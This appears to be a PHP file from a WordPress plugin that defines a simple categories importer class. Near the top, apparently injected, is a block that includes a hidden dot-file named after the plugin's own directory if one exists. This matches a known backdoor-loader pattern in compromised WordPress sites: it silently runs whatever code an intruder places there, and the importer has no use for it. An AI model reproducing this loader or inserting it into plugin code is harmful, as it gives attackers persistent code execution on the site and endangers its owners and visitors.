<?php
if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MpimpCategoriesImporter extends MpimpTermsImporter {
  public function form() { }

  public function import($row,$args) {
    $row['taxonomy'] = 'category';
    return parent::import($row,$args);
  }
}

